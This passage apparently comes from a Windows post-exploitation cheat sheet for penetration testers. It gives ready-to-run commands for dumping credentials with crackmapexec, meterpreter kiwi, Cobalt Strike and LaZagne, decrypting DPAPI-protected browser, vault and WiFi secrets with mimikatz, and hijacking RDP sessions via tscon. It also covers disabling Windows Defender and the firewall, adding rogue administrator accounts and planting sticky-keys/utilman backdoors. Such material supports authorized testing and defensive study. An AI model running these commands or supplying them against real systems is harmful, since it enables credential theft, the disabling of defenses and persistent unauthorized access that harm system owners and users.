    on disk.
  - `lsassy` which leverages the `lsassy` Python library.

Note that as `Invoke-Mimikatz.ps1` is being more and more detected by antivirus
solutions, it is recommended to make use of the `lsassy` module.

```
# It is recommended to use the released crackmapexec binaries from GitHub (a GitHub account being required to download the files): https://github.com/byt3bl33d3r/CrackMapExec/actions

# lsassy module
crackmapexec smb <TARGETS> -M lsassy (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Mimikatz module
crackmapexec smb <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

###### Metasploit / meterpreter

The `meterpreter` extensions `mimikatz` and `kiwi` can be used to dump
credentials through a `meterpreter` session without the need to write any file
to the compromised host's disks. The `kiwi` extension replace the previous
`mimikatz` extension with a much simpler interface command system and works on
`Windows XP SP3` and `Windows 2003 SP1` all the way up to `Windows 10` and
`Windows 2019`.

On `x64` host, make sure that the `meterpreter` session is running as a 64 bits
process (using `sysinfo`), otherwise the `meterpreter` will attempt to load a
32 bits version of `Mimikatz` into memory, which will cause most features to be
non-functional.

```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
meterpreter> creds_kerberos / creds_msv / creds_ssp / creds_tspkg / creds_wdigest    

# Older version
meterpreter> load mimikatz

meterpreter> mimikatz_command -f samdump::hashes
meterpreter> mimikatz_command -f sekurlsa::logonpasswords
meterpreter> kerberos / livessp / msv / ssp / tspkg / wdigest  
```

###### Cobalt Strike

The `Cobalt Strike` `beacon` built-in function `[beacon] -> Access ->
Run Mimikatz` will execute `mimikatz` `sekurlsa::logonpasswords` through a
`beacon`.

The function output will be automatically parsed and the harvested credentials
added to the `Cobalt Strike` credentials database: `View -> Credentials`.

#### DPAPI - Generic and third parties credentials

Windows exposes cryptographic functions through the `Data Protection
Application Programming Interface (DPAPI)` API to allow third parties programs
to locally store encrypted secrets. `DPAPI` notably provides the
`CryptProtectData` and `CryptUnprotectData` functions to, respectively, encrypt
and decrypt data. Leveraging the `DPAPI`, softwares can thus rely on the
operating system to manage the cryptographic keys and to implement the
cryptographic algorithms. Among others, the `Google Chrome` and
`Internet Explorer` / `Edge` web browsers as well as the Windows
`Remote Desktop Protocol (RDP)` utility and the `Wireless Local Area Network
(WLANSVC)` service save credentials using the `DPAPI`.

Secrets originating from Microsoft products are generally stored by the
`Credential Manager` in:

  - `Credentials` files, located in
    `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Roaming\Microsoft\Credentials\
    <GUID>`.

  - `Windows Vaults`, such as the `Windows Credentials` vault (independent
    from `Credentials` files). `Vaults` are stored as a combination of `vpol`
    and `vsch` files in `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Microsoft
    \Vault\<GUID>`.

`Google Chrome` saves by default credentials and secrets, such as cookies, in:

  - the `Login Data` `SQLitev3` database, located in
    `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\
    Default\Login Data`.

  - the `Cookies` file, located in
    `%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Local\Google\Chrome\User Data\
    Default\Cookies`.

The aforementioned files are only accessible to the specific user (owner of the
files), the local `Administrators` group, and the Windows `NT AUTHORITY\SYSTEM`
built-in account.

```
# Lists the Credentials files for each user, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Roaming\Microsoft\Credentials"

# Lists the Google Chrome credentials and cookies files, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data"
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Cookies"

# Lists the configured Windows Vaults and information about the vaults's stored credentials (notably username, originating application, target).
# Current user Windows Vault.
vaultcmd /list
# Lists the Windows Vault of each user, given the current security context.
Get-ChildItem -Force -Path "C:\Users\*\AppData\Local\Microsoft\Vault\*"

# Lists information about the specified Windows Vault.
# Default Windows Vaults: Windows Credentials (GUID: 77BC582B-F0A6-4E15-4E80-61736B6F3B29) and Web Credentials (GUID: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28).
vaultcmd /listcreds:"<VAULT_NAME | VAULT_GUID>" /all

# Lists the configured WiFi profiles, indicating if a security key is included
netsh wlan show profiles
```

Credentials are ultimately stored as `CredentialBlob`, encrypted using a
`DPAPI` `MasterKey`. The `DPAPI` `MasterKeys` are stored as files, located in
`%SYSTEMDRIVE%\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\<USER_SID>\<GUID>`.

The `DPAPI` `MasterKeys` are protected:
  - for domain users, using a combination of the user's `SID` and (current or
  previous) `NTLM` hash. A copy of the `MasterKey` is also protected using
  the `DPAPI` `Domain Backup Key`.
  - for local users, using a combination of the user's `SID` and (current or
  previous) `SHA1` hash.

Those properties imply that:
  - All domain users `DPAPI` `MasterKeys` can be retrieved, and stored
  credentials decrypted, if the `DPAPI` `Domain Backup Key` is compromised.
  - The `NTLM` hashes of local users can not be used to decrypt `DPAPI`
  `MasterKeys` as the plaintext password is required to compute the user
  password `SHA1` hash.

```
# Lists the DPAPI MasterKeys files for each user, given the current security context.
Get-ChildItem -Force -Recurse -Path "C:\Users\*\AppData\Roaming\Microsoft\Protect\S-*"
```

`mimikatz` implements various `DPAPI` modules to decrypt `DAPI`
`CredentialBlob` and operationally parse the resulting data in order to extract
the saved credentials:
  - `dpapi::blob`: raw `CredentialBlob` with out parsing of the resulting data
  - `dpapi::capi` / `dpapi::cng`: Windows `Cryptographic API (CAPI)` /
  `Cryptography API: Next Generation (CNG)` containing the users' certificates
  public and private keys. `CNG` is the replacement of `CAPI`, starting from
  the Windows Server 2008 and Windows Vista operating system.
  - `dpapi::cred`: Windows `Credentials` files.
  - `dpapi::vault`: Windows `Vaults` directories.
  - `dpapi::wifi`: `WiFi` password saved by the `WLANSVC` service.
  - `dpapi::wwan`: mobile cellular network passwords for embedded module
  adapter saved by the `WWANSVC` service.
  - `dpapi::chrome`: credentials and cookies saved by `Google Chrome`.
  - `dpapi::rdg`: `RDP` files generated by the `Remote Desktop Connection
  Manager (RDCman)` whenever saving `RDP` credentials.

Depending on the attack scenario and satisfied prerequisite(s), `DAPI`
`CredentialBlob` can be decrypted using `mimikatz` in a number of ways:

| Prerequisite(s) | Description | Process |
|-----------------|-------------|---------|
| Running under the specific user security context (whom may not be privileged). | Leverages the `DPAPI` `CryptUnprotectData` function, implicitly using the specific user `MasterKeys`, to decrypt the specified `DPAPI` blob. | Decryption of the specified blob, with the according `mimikatz` module: <br/> `mimikatz.exe "dpapi::<MODULE> /in:<BLOB_PATH> /unprotect" exit` |  
| Privileged access (`SeDebugPrivilege` privilege) on the system while the specific user is logged in. | Extracts the cached `DPAPI` `MasterKeys` from memory to decrypt the specified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Extraction of all users `MasterKeys` in memory: <br/> `mimikatz# privilege::debug` <br/> `mimikatz# sekurlsa::dpapi` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Privileged access on the system and knowledge of the specific user **plaintext password**. | Uses the user's plaintext password to decrypt the `MasterKey` in order to decrypt the specified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Decryption of the required `MasterKey` using the user plaintext password: <br/> `mimikatz.exe "privilege::debug" "token::elevate" "dpapi::masterkey /in:<MASTER_KEY_PATH> /sid:<USER_SID> /password:<USER_PASSWORD> /protected" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Knowledge of the specific user **plaintext password**. | Uses the user's plaintext password to start a process under the specific user security context in order to leverage the `DPAPI` `CryptUnprotectData` function to decrypt the specified `DPAPI` blob. | Refer to the `Windows - Lateral movement` note for TTP to locally or remotely start a process using the user's plaintext password. <br/> Running under the specific user security context, the first method can then be used. |
| Knowledge of the specific **domain** user **`NTLM` hash** and a network connection to a Domain Controller. | Uses the user's `NTLM` hash to replace the `Logon Session` in a process's `Access Token`, in order to access resources over the network using the provided user identity. Then leverages the `Microsoft BackupKey Remote Protocol (MS-BKRP)` `MSRPC` interface of a Domain Controller to request the decryption of the required `DPAPI` `MasterKey` (by design functionality, needed for password renewal and support of smart cards). | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/>  Refer to the `Windows - Lateral movement` note for TTP to locally or remotely start a process using the user's `NTLM` hash. Under the newly created process, decryption of the required `MasterKey` through a `MS-BKRP` request to a Domain Controller: <br/> `mimikatz.exe "dpapi::masterkey /in:<MASTER_KEY_PATH> /rpc" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Knowledge of the `DPAPI` `Domain Backup Key`. | Uses the `DPAPI` `Domain Backup Key` to decrypt the `DPAPI` `MasterKeys` of domain users in order to decrypt the specified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Decryption of the required `MasterKey` using the `DPAPI` `Domain Backup Key`: <br/> `mimikatz.exe "privilege::debug" "token::elevate" "dpapi::masterkey /in:<MASTER_KEY_PATH> /pvk:<BACKUP_KEY_PRIVATE_KEY_FILE>" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |

###### [SAM/mscachev2/LSASS/DPAPI] Automated Windows, generic and third parties credentials retrieval  

`LaZagne` is a Python utility, available as a standalone binary, that attempt
to retrieve the credentials possibly stored on a system by a number of third
party softwares, such as web browsers, system administrator and developers
utilities, etc. It will conduct the search for every user profiles and will
retrieve the credentials stored by third parties software through different
mediums (plaintext files, registry keys, local databases, etc.), decrypting the
`DPAPI` encrypted blob using the `MasterKeys` extracted from memory.
Additionally, `LaZagne` will retrieve credentials from the Windows `MScache`,
`SAM` registry hive and `LSASS` process if executed with the necessary
elevated privileges.

```
lazagne.exe all -oA -output <OUTPUT_FILE_PATH>
```

###### SecureString

If an encrypted standard string of a PowerShell  `SecureString` object is
compromised, from a file for example, the `SecureString` can be directly
re used:

```
$user = "<WORKGROUP | DOMAIN>\<USERNAME>";
$pass = "<SECURESTRING>" | ConvertTo-SecureString;
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)

# Plaintext password can then be retrieved  
$creds.GetNetworkCredential() | fl
```

The PowerShell credentials object can now be passed to cmdlets supporting it,
such as `Start-Process` / `Start-Job` or `Invoke-Command` / `Enter-PSSession`.

Note that if the `SecureString` object was created using a plaintext password,
instead of using a `Key` / `SecureKey`, the stored standard string can only be
converted to a `SecureString` object by the account, local or domain joined,
that created the `SecureString` initially. Otherwise, the following error
message will be returned:  

```
ConvertTo-SecureString : Key not valid for use in specified state.
```

### RDP Session Hijacking

If `Administrator` / `NT AUTHORITY\SYSTEM` privileges could be obtained on a
host, `Remote Desktop Protocol (RDP)` sessions of others users can be hijacked.
This could be leveraged to access the host under the security context of the
hijacked user, through a graphical explorer, with out knowing its password.

Note that:
  - Hijacking of disconnected sessions is possible
  - Hijacking a session will unlock locked sessions (with out the need to
    provide credentials)

Retrieve the `ID` of the eventual `RDP` sessions present on the host:

```
# SESSIONNAME = rdp-*
query user
```

Create and start a service that will execute `tscon` to hijack the specified
`RDP` session:

```
sc create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<SESSION_NAME>"
net start sesshijack
```

### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| Network interfaces | ipconfig | | |
| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
| ARP table | arp -a  |   |   |

### Manage

###### Windows Defender

The following Powershell command can be used to switch off Windows Defender
real-time protection:

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

###### Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```
# Show the profile applied to each network adapter
netsh advfirewall monitor show currentprofile

# Windows Firewall state for all profile (Public / Domain / Private)
netsh advfirewall show allprofiles
Get-NetFirewallProfile

# Show all rules for the given profile
netsh advfirewall firewall show rule profile=<public | private | domain | any | ...> name=all
Get-NetFirewallProfile -Name <Public | Private | Domain | * | ...> | Get-NetFirewallRule
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

Windows blocks inbound connections and allows outbound connections for all
profiles by default.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```

###### Activate RDP

RDP can be enabled / disabled with out the need to restart the system with the
`reg` utility:

```
# Check if RDP is enabled
netstat /p tcp /a | findstr 3389
# If RDP is enabled, registry value should be equal to 0x0
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Disable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

### Persistence

###### Add local Administrator

The following `net user` commands can be used to create and add a windows
account in the administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

###### Grant user RDP access

To access a host remotely in RDP, the user used must be present in the "Remote
Desktop Users" localgroup on the host. The following `net localgroup` commands
can be used to add the specified user in this group:

```
net localgroup "Remote Desktop Users" <USERNAME> /add
net localgroup "Utilisateurs du Bureau à distance" <USERNAME> /add

# Connect in RDP from Linux
rdesktop -k fr -g 90% -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <HOSTNAME | IP>
```

###### Sticky Keys or Utilman backdoors

Both the `Sticky Keys` (sethc.exe) and `Utilman` (utilman.exe) utility tools
can be launched at the login screen before authentication as `NT
AUTHORITY\SYSTEM`.

Replacing either of those binaries with `cmd.exe` can be a way to maintain
persistence on the compromised system.

```
cd windows\system32
copy cmd.exe sethc.exe
copy cmd.exe utilman.exe
```

The `sethc.exe` is launched after pushing the Maj key five times and the
`utilman.exe` can be started using Win + u.

However, a graphical access to the host login prompt is needed in order to
make use of this backdoor mechanism.  

To do so remotely:

  - RDP must be enabled and not firewalled on the host
  - RDP NLA deactivated if no valid credentials are known (credentials of a
    user in the Remote Desktop Users group).

###### ASEP / WMI subscription / DLL hijacking

TODO
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
